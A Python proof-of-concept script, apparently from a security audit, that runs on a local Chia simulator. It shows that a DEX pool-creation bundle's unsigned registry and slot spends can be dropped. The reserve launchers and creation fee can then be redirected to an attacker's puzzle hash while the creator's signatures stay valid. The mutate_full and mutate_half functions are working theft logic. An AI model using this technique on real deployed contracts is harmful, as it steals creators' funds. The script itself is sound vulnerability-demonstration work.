#!/usr/bin/env python3
"""F1 on a REAL Chia simulator: the V14 creation bundle's binding spends (the
registry `register` + slot spends) are unsigned and separable from the creator's
SIGNED spends, so a farmer can drop them and redirect each reserve launcher's
CREATE_COIN target and the fee settlement's payee, keeping the creator's signed
spends byte-for-byte.

This mirrors scratchpad/probe_creation_split.py, which demonstrated the finding
offline against chia_rs.get_conditions_from_spendbundle (no signature check). Here
the creator's coins are REAL coins in the simulator's coin store, signed with REAL
AugSchemeMPL AGG_SIG_ME signatures, and every verdict is the real mempool's.

Run with cwd = <repo>/contracts (the drivers do sys.path.insert(0, ".")):
    cd <repo>/contracts && <venv>/bin/python <this file>
"""
import asyncio
import sys

sys.path.insert(0, ".")
sys.stdout.reconfigure(encoding="utf-8")

from chia.consensus.default_constants import DEFAULT_CONSTANTS
from chia.types.blockchain_format.program import Program
from chia.types.coin_spend import make_spend
from chia.types.mempool_inclusion_status import MempoolInclusionStatus
from chia.wallet.cat_wallet.cat_utils import (
    CAT_MOD, SpendableCAT, construct_cat_puzzle, unsigned_spend_bundle_for_spendable_cats,
)
from chia.wallet.lineage_proof import LineageProof
from chia.wallet.puzzles.p2_delegated_puzzle_or_hidden_puzzle import puzzle_for_synthetic_public_key
from chia.wallet.puzzles.singleton_top_layer_v1_1 import SINGLETON_LAUNCHER, SINGLETON_LAUNCHER_HASH
from chia.wallet.trading.offer import OFFER_MOD_HASH
from chia._tests.util.spend_sim import sim_and_client
from chia_rs import AugSchemeMPL, Coin, G2Element, SpendBundle
from chia_rs.sized_bytes import bytes32
from chia_rs.sized_ints import uint64

import forge_v14_create as create
import forge_v14_driver as drv
from forge_offer import ZERO_32

AGG_SIG_ME = 50
CREATE_COIN = 51
ADD_DATA = DEFAULT_CONSTANTS.AGG_SIG_ME_ADDITIONAL_DATA

IDENTITY = Program.to(1)
IDENTITY_HASH = IDENTITY.get_tree_hash()

# Real key, exactly as the offline probe: the p2 puzzle curries the RAW g1 as the
# synthetic public key, so the signing secret key is this raw key (no synthetic step).
SK = AugSchemeMPL.key_gen(b"\x01" * 32)
PK = SK.get_g1()
P2 = puzzle_for_synthetic_public_key(PK)
P2_HASH = P2.get_tree_hash()

CREATOR_PH = bytes32(b"\x77" * 32)
ATTACKER_PH = bytes32(b"\x99" * 32)

CREATION_FEE = 1_000_000
NETWORK_FEE = 5_000_000
XCH_RESERVE = 100_000_000
CAT_RESERVE = 50_000
TOTAL_LP = 50_000


# ----------------------------------------------------------------------------- helpers

async def farm_identity(sim, client, blocks=4):
    for _ in range(blocks):
        await sim.farm_block(IDENTITY_HASH)
    recs = await client.get_coin_records_by_puzzle_hash(IDENTITY_HASH, include_spent_coins=False)
    return sorted((r.coin for r in recs), key=lambda c: int(c.amount), reverse=True)


async def push_ok(client, sim, bundle, label):
    status, error = await client.push_tx(bundle)
    if status != MempoolInclusionStatus.SUCCESS:
        raise RuntimeError(f"setup push '{label}' refused: {error.name if error else status}")
    await sim.farm_block()


def sign_creator_spends(spends):
    """Real AGG_SIG_ME signature over the creator's spends. Run each spend's real
    puzzle_reveal against its solution, read every (50 pk msg) it emits, and sign
    msg + coin_id + AGG_SIG_ME_ADDITIONAL_DATA. Works for the bare p2 XCH spend and
    the CAT-wrapped spends alike, because the CAT layer passes AGG_SIG through."""
    sigs = []
    for cs in spends:
        puz = Program.from_bytes(bytes(cs.puzzle_reveal))
        sol = Program.from_bytes(bytes(cs.solution))
        for cond in puz.run(sol).as_iter():
            items = list(cond.as_iter())
            if items and items[0].atom is not None and items[0].as_int() == AGG_SIG_ME:
                msg = bytes(items[2].atom)
                sigs.append(AugSchemeMPL.sign(SK, msg + cs.coin.name() + bytes(ADD_DATA)))
    if not sigs:
        raise RuntimeError("no AGG_SIG_ME conditions found on the creator spends")
    return AugSchemeMPL.aggregate(sigs)


async def mint_registry(sim, client, funding: Coin):
    """Mint the registry singleton and run init, exactly as scripts/sim-v14.py does,
    then return (post-init Registry, slots in create.plan's JSON shape)."""
    registry = drv.make_registry(creation_fee=CREATION_FEE, treasury_ph=IDENTITY_HASH,
                                 launcher_parent=funding.name())
    change = int(funding.amount) - 1
    funding_spend = make_spend(funding, IDENTITY, Program.to([
        [CREATE_COIN, SINGLETON_LAUNCHER_HASH, 1],
        [CREATE_COIN, IDENTITY_HASH, change],
    ]))
    launcher = Coin(funding.name(), SINGLETON_LAUNCHER_HASH, uint64(1))
    launcher_spend = make_spend(launcher, SINGLETON_LAUNCHER,
                                Program.to([registry.coin.puzzle_hash, 1, []]))
    bundle, _ = drv.registry_spend(registry, "forge_registry_init", [],
                                   extra_spends=[funding_spend, launcher_spend])
    await push_ok(client, sim, bundle, "registry genesis + init")

    # the genesis registry coin created the two sentinel slots; create.plan's slot_spend
    # names it as the slots' parent (coin json + inner hash).
    parent_json = {"parent_coin_info": registry.coin.parent_coin_info.hex(),
                   "puzzle_hash": registry.coin.puzzle_hash.hex(), "amount": 1}
    slots = {k.hex(): {"key": k.hex(), "launcher_id": ZERO_32.hex(),
                       "left": drv.MIN_KEY.hex(), "right": drv.MAX_KEY.hex(),
                       "parent": parent_json, "parent_inner_hash": registry.inner_hash.hex()}
             for k in (drv.MIN_KEY, drv.MAX_KEY)}
    change_coin = Coin(funding.name(), IDENTITY_HASH, uint64(change))
    return registry.advance([1, 0]), slots, change_coin


async def build_fixtures(sim, client):
    """Mint the registry, and build the creator's REAL p2 XCH coin and CAT coin.
    Returns (registry, slots, CreatorXch, asset_id, CreatorCat)."""
    coins = await farm_identity(sim, client, blocks=6)
    pool_funds = coins[0]

    # registry
    reg, slots, change_coin = await mint_registry(sim, client, pool_funds)

    # a fresh IDENTITY coin to fund everything else
    src = change_coin
    need_xch = 2 + XCH_RESERVE + CREATION_FEE + (TOTAL_LP - 1) + NETWORK_FEE + 777

    # 1) the creator's XCH coin at the p2 puzzle hash
    xch_change = int(src.amount) - need_xch
    assert xch_change >= 0, f"source {int(src.amount)} too small for {need_xch}"
    src_spend = make_spend(src, IDENTITY, Program.to([
        [CREATE_COIN, P2_HASH, need_xch],
        [CREATE_COIN, IDENTITY_HASH, xch_change],
    ]))
    await push_ok(client, sim, SpendBundle([src_spend], G2Element()), "fund creator xch")
    creator_xch_coin = Coin(src.name(), P2_HASH, uint64(need_xch))
    rec = await client.get_coin_record_by_name(creator_xch_coin.name())
    assert rec is not None and not rec.spent, "creator xch coin not on chain"
    xch = create.CreatorXch(creator_xch_coin, P2)

    # 2) issue a test CAT to IDENTITY, then move it to the creator's p2 inner
    identity_src = Coin(src.name(), IDENTITY_HASH, uint64(xch_change))
    asset_id, minted, lineage, mint_bundle = issue_test_cat(identity_src, CAT_RESERVE + 10_000, salt=0xA7)
    await push_ok(client, sim, mint_bundle, "issue test cat")
    # move the minted CAT(asset, IDENTITY) coin to CAT(asset, P2)
    move = unsigned_spend_bundle_for_spendable_cats(CAT_MOD, [SpendableCAT(
        minted, asset_id, IDENTITY,
        Program.to([[CREATE_COIN, P2_HASH, CAT_RESERVE + 10_000, [P2_HASH]]]),
        lineage_proof=lineage)]).coin_spends
    await push_ok(client, sim, SpendBundle(move, G2Element()), "move cat to creator p2")
    creator_cat_coin = Coin(minted.name(),
                            construct_cat_puzzle(CAT_MOD, asset_id, P2).get_tree_hash(),
                            uint64(CAT_RESERVE + 10_000))
    rec = await client.get_coin_record_by_name(creator_cat_coin.name())
    assert rec is not None and not rec.spent, "creator cat coin not on chain"
    cat_lineage = LineageProof(minted.parent_coin_info, IDENTITY_HASH, minted.amount)
    cat = create.CreatorCat(asset_id, creator_cat_coin, P2, cat_lineage)
    return reg, slots, xch, asset_id, cat


def issue_test_cat(funding: Coin, amount: int, salt: int):
    """Mint `amount` of a fresh permissive test CAT (quoted-nil TAIL) from an
    anyone-can-spend XCH coin -- same mint as contracts/_sim_harness.issue_cat."""
    tail = Program.to((1, None)).curry(salt)
    asset_id = tail.get_tree_hash()
    eve_ph = construct_cat_puzzle(CAT_MOD, asset_id, IDENTITY).get_tree_hash()
    change = int(funding.amount) - 1 - amount
    assert change >= 0, f"funding {int(funding.amount)} cannot back mint {amount}"
    funding_conditions = [[CREATE_COIN, eve_ph, 1]]
    if change > 0:
        funding_conditions.append([CREATE_COIN, IDENTITY_HASH, change])
    funding_spend = make_spend(funding, IDENTITY, Program.to(funding_conditions))
    eve = Coin(funding.name(), eve_ph, uint64(1))
    inner_solution = Program.to([
        [CREATE_COIN, IDENTITY_HASH, amount, [IDENTITY_HASH]],
        [CREATE_COIN, 0, -113, tail, Program.to(0)],
    ])
    spendable = SpendableCAT(
        eve, asset_id, IDENTITY, inner_solution,
        lineage_proof=LineageProof(), extra_delta=amount - 1,
        limitations_program_reveal=tail, limitations_solution=Program.to(0),
    )
    ring = unsigned_spend_bundle_for_spendable_cats(CAT_MOD, [spendable]).coin_spends
    minted = Coin(eve.name(), construct_cat_puzzle(CAT_MOD, asset_id, IDENTITY).get_tree_hash(), uint64(amount))
    lineage = LineageProof(eve.parent_coin_info, IDENTITY_HASH, uint64(1))
    return asset_id, minted, lineage, SpendBundle([funding_spend, *ring], G2Element())


def make_config(asset_id):
    return create.CreationConfig([None, asset_id], [XCH_RESERVE, CAT_RESERVE], [1, 1],
                                 30, 5, IDENTITY_HASH, TOTAL_LP, "TXCH", "TXCH/A")


# -------------------------------------------------------------- the mutation (verbatim logic)

def mutate_full(plan, reg_coin_id, asset_id):
    """Drop the registry + slot spends; rewrite each reserve launcher's created_puzzle_hash
    and the fee settlement's payee to ATTACKER_PH; keep the creator spends byte for byte."""
    launcher_phs = {drv.RESERVE_LAUNCHER_HASH, drv.reserve_launcher_full_hash(asset_id)}
    attack, dropped = [], []
    for cs in plan.router_spends:
        ph = cs.coin.puzzle_hash
        if cs.coin.name() == reg_coin_id or cs.coin.amount == 0:   # registry singleton + 0-mojo slots
            dropped.append(cs.coin.name().hex()[:8]); continue
        if ph in launcher_phs:
            sol = Program.from_bytes(bytes(cs.solution))
            if ph == drv.RESERVE_LAUNCHER_HASH:                    # bare XCH launcher
                _created, amount, lid = list(sol.as_iter())
                new_sol = Program.to([ATTACKER_PH, amount, lid])
            else:                                                  # CAT-wrapped launcher
                items = list(sol.as_iter())
                _created, amount, lid = list(items[0].as_iter())
                items[0] = Program.to([ATTACKER_PH, amount, lid])
                new_sol = Program.to(items)
            attack.append(make_spend(cs.coin, Program.from_bytes(bytes(cs.puzzle_reveal)), new_sol)); continue
        if ph == bytes32(OFFER_MOD_HASH) and cs.coin.amount == CREATION_FEE:   # fee settlement
            attack.append(make_spend(cs.coin, Program.from_bytes(bytes(cs.puzzle_reveal)),
                                     Program.to([[cs.coin.name(), [ATTACKER_PH, CREATION_FEE]]]))); continue
        attack.append(cs)
    return attack, dropped


def mutate_half(plan, asset_id):
    """Keep the registry + slot spends; rewrite ONLY the reserve launchers' targets."""
    launcher_phs = {drv.RESERVE_LAUNCHER_HASH, drv.reserve_launcher_full_hash(asset_id)}
    out = []
    for cs in plan.router_spends:
        ph = cs.coin.puzzle_hash
        if ph in launcher_phs:
            sol = Program.from_bytes(bytes(cs.solution))
            if ph == drv.RESERVE_LAUNCHER_HASH:
                _created, amount, lid = list(sol.as_iter())
                new_sol = Program.to([ATTACKER_PH, amount, lid])
            else:
                items = list(sol.as_iter())
                _created, amount, lid = list(items[0].as_iter())
                items[0] = Program.to([ATTACKER_PH, amount, lid])
                new_sol = Program.to(items)
            out.append(make_spend(cs.coin, Program.from_bytes(bytes(cs.puzzle_reveal)), new_sol)); continue
        out.append(cs)
    return out


def verdict(client_tuple):
    status, error = client_tuple
    return f"{status.name}" + (f" / {error.name}" if error else "")


async def coin_exists(client, coin):
    rec = await client.get_coin_record_by_name(coin.name())
    return rec is not None and not rec.spent


async def additions_at(client, ph):
    recs = await client.get_coin_records_by_puzzle_hash(bytes32(ph), include_spent_coins=False)
    return [(int(r.coin.amount)) for r in recs]


# ----------------------------------------------------------------------------------- main

async def run_control():
    print("=" * 78)
    print("CONTROL: honest creation bundle on a fresh simulator")
    print("=" * 78)
    async with sim_and_client() as (sim, client):
        reg, slots, xch, asset_id, cat = await build_fixtures(sim, client)
        plan = create.plan(reg, slots, make_config(asset_id), xch, {asset_id: cat}, CREATOR_PH, NETWORK_FEE)
        sig = sign_creator_spends(plan.creator_spends)
        honest = create.finalize(plan, sig)
        print(f"  bundle has {len(honest.coin_spends)} spends "
              f"({len(plan.creator_spends)} creator / {len(plan.router_spends)} router)")
        status, error = await client.push_tx(honest)
        conds, _ = drv.validate(honest)
        print(f"  push_tx verdict: {verdict((status, error))}  cost {conds.cost:,}")
        assert status == MempoolInclusionStatus.SUCCESS, "the control was refused"
        await sim.farm_block()
        pool = plan.pool
        pool_ok = await coin_exists(client, pool.coin)
        res_ok = [await coin_exists(client, r.coin) for r in pool.reserves]
        reg_ok = await coin_exists(client, plan.registry_after.coin)
        print(f"  pool singleton on chain: {pool_ok}")
        print(f"  both reserves on chain:  {res_ok}")
        print(f"  registry child on chain: {reg_ok}")
        return pool_ok and all(res_ok) and reg_ok


async def run_attack():
    print("=" * 78)
    print("ATTACK (full): drop register + slots, redirect reserves + fee to the attacker")
    print("=" * 78)
    async with sim_and_client() as (sim, client):
        reg, slots, xch, asset_id, cat = await build_fixtures(sim, client)
        plan = create.plan(reg, slots, make_config(asset_id), xch, {asset_id: cat}, CREATOR_PH, NETWORK_FEE)
        sig = sign_creator_spends(plan.creator_spends)   # covers ONLY the creator spends
        reg_coin_id = reg.coin.name()
        attack_spends, dropped = mutate_full(plan, reg_coin_id, asset_id)
        print(f"  dropped unsigned spends: {dropped}")
        bundle = SpendBundle([*plan.creator_spends, *attack_spends], sig)
        status, error = await client.push_tx(bundle)
        print(f"  push_tx verdict: {verdict((status, error))}")
        if status != MempoolInclusionStatus.SUCCESS:
            print("  -> REFUSED on the simulator: the creation bundle can no longer be split.")
            return False
        await sim.farm_block()
        att_xch = await additions_at(client, ATTACKER_PH)
        cat_att_ph = construct_cat_puzzle(CAT_MOD, asset_id, Program.to(ATTACKER_PH)).get_tree_hash_precalc(ATTACKER_PH)
        att_cat = await additions_at(client, cat_att_ph)
        eve_ok = await coin_exists(client, plan.pool.coin)   # pool.coin IS the eve singleton
        creator_lp_ph = construct_cat_puzzle(CAT_MOD, plan.pool.lp_asset_id,
                                             Program.to(CREATOR_PH)).get_tree_hash_precalc(CREATOR_PH)
        creator_lp = await additions_at(client, creator_lp_ph)
        reserves_named_exist = [await coin_exists(client, r.coin) for r in plan.pool.reserves]
        print(f"  XCH coins now at ATTACKER_PH:            {att_xch}")
        print(f"  CAT({asset_id.hex()[:8]}) coins at ATTACKER_PH: {att_cat}")
        print(f"  pool eve singleton created:              {eve_ok}")
        print(f"  creator still receives genesis LP:       {creator_lp}")
        print(f"  reserve coins the pool state names exist: {reserves_named_exist}")
        return True


async def run_half():
    print("=" * 78)
    print("HALF ATTACK: keep register + slots, rewrite ONLY the reserve launcher targets")
    print("=" * 78)
    async with sim_and_client() as (sim, client):
        reg, slots, xch, asset_id, cat = await build_fixtures(sim, client)
        plan = create.plan(reg, slots, make_config(asset_id), xch, {asset_id: cat}, CREATOR_PH, NETWORK_FEE)
        sig = sign_creator_spends(plan.creator_spends)
        half_spends = mutate_half(plan, asset_id)
        bundle = SpendBundle([*plan.creator_spends, *half_spends], sig)
        status, error = await client.push_tx(bundle)
        print(f"  push_tx verdict: {verdict((status, error))}")
        print(f"  (expected: a refusal from register's announcement assertion)")
        return status != MempoolInclusionStatus.SUCCESS, (error.name if error else None)


async def main():
    control_ok = await run_control()
    print()
    attack_ok = await run_attack()
    print()
    half_refused, half_code = await run_half()
    print()
    print("=" * 78)
    print("SUMMARY")
    print("=" * 78)
    print(f"  CONTROL accepted, all coins present: {control_ok}")
    print(f"  FULL ATTACK accepted and paid the attacker: {attack_ok}")
    print(f"  HALF ATTACK refused: {half_refused}  code: {half_code}")


if __name__ == "__main__":
    asyncio.run(main())
